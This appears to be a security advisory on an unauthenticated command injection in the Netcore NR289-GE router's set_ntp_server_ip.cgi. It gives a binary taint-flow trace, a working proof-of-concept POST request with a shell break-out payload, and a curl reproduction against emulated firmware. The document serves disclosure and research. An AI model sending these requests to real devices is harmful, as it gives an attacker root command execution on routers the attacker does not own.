# Netcore NR289-GE AC Router — Unauthenticated Command Injection in `set_ntp_server_ip.cgi`

- Vendor: Netcore (磊科)
- Product: Netcore NR289-GE (SMB router / AC controller)
- Firmware Version: V1.4.5102 (2018.06.14, Linux 2.6.36, MIPS32r2 big-endian / RTL8198C+RTL8370)
- Vulnerability Type: OS Command Injection (CWE-78), reachable **without authentication** via the boa `.ico` whitelist flaw (see companion advisory *Netcore_NR289-GE_authentication_bypass*)

## Overview

`set_ntp_server_ip.cgi` (handler `set_ntp_server_ip_cgi` in `/web/cgi-bin/cgitest.cgi`) distributes an NTP server address to managed APs. The user-supplied `ntp_ip` form field is embedded into a shell command executed by `system()` with no validation:

`POST /set_ntp_server_ip.cgi` (authenticated) **or** `POST /<anything>.ico/set_ntp_server_ip.cgi` (unauthenticated)

Precondition: the `mac` field's first 6 bytes must match an entry of the bound-AP list (`/tmp/para/bind_list_table`), i.e. the AC is managing at least one AP.

**Exploitation constraint:** like `ap_ip.cgi`, the field is effectively truncated at ~19-20 bytes (unterminated `strncpy`), so the command budget is ~12 characters inside `";CMD;#`. For full-length commands use `location_time.cgi` (no truncation), documented in the companion advisory.

## Vulnerability Details

Taint flow (instruction level; binary `cgitest.cgi`):

```
main             0x449d00  basename(argv[0]) -> "set_ntp_server_ip.cgi" -> set_ntp_server_ip_cgi (perm 255)
set_ntp_server_ip_cgi  0x4200cc:
                          get_form_value("ntp_ip")   <- taint source, NO validation
                          get_form_value("mac")      -> bind-list lookup key
set_ntpserverip  0x435e88  forwards both, no checks
send_wget_set_command 0x4353c0 (code 0x300021):
                 0x4354bc  read_ap_bind_list()       -> /tmp/para/bind_list_table
                 0x4354cc  Find_existed_bind_ap(mac) -> memcmp(first 6 bytes)
                          sprintf(cmd, "/bin/wget_1 -t 2 -T 6 --http-user=guest --http-password=guest
                           --post-data \"time_server=%s&time_set=1\"
                           \"http://%s/cgi-bin-igd/netcore_set.cgi\" >/tmp/status", ntp_ip, ap_ip)
                 0x435540  system(cmd)               <- sink
```

`time_server=%s` sits inside a double-quoted argument, so `";CMD;#` breaks out. Verified execution (strace capture) with `ntp_ip=";echo 1>/tmp/pn;#`:

```
sh -c "/bin/wget_1 -t 2 -T 6 --http-user=guest --http-password=guest
 --post-data \"time_server=\";echo 1>/tmp/pn;#&time_set=1\" \"http://192.168.1.1/...\" >/tmp/status"
```

`/tmp/pn` was then created on the device by the injected command. (Note: after the injected command runs, the CGI response may be empty/aborted — judge execution by side effects, not the HTTP response.)

## Proof of Concept

```http
POST /x.ico/set_ntp_server_ip.cgi HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

mac=AA%3ABB%3ACC%3ADD%3AEE%3AFF&ntp_ip=%22%3Becho%20pwn%3E%2Ftmp%2Fpn%3B%23
```

(URL-decoded `ntp_ip`: `";echo pwn>/tmp/pn;#`; `mac` first 6 bytes must match a bound AP.)

## Impact

Unauthenticated remote command execution as **root** (payload length constrained to ~12 command characters on this endpoint; sufficient for short file writes and for multi-request staging of longer payloads).

## Reproduction Result

Dynamically verified against the firmware emulated with qemu-mips (big-endian) + chroot, with a bound-AP entry mocked into `/tmp/para/bind_list_table`:

```
$ curl -X POST http://<target>/x.ico/set_ntp_server_ip.cgi \
       --data-urlencode "mac=AA:BB:CC:DD:EE:FF" --data-urlencode 'ntp_ip=";echo pwn>/tmp/pn;#'
$ ls -la /tmp/pn     # on the emulated target — created by the injected command
-rw-r----- 1 root root 1 ... /tmp/pn
```
